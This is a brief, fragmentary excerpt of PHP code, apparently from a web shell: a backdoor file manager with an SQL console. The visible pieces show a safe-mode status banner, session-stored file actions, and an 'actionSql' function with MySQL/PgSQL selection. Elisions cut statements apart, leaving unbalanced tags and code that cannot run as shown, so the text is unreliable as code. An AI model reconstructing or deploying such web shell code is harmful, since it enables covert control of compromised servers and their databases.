...
:'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=<?=$color?><?php 
} 
...
?><?php 
    ...
    ?><?php if(!empty($_SESSION['act'])&&@count($_SESSION['f'])){?><?php }?><?php 
    printFooter(); 
} 
...
function actionSql() { 
    ...
    printHeader(); 
    ?><?php if(@$_POST['type']=='mysql')echo 'selected';?><?php if(@$_POST['type']=='pgsql')echo 'selected';?><?php 
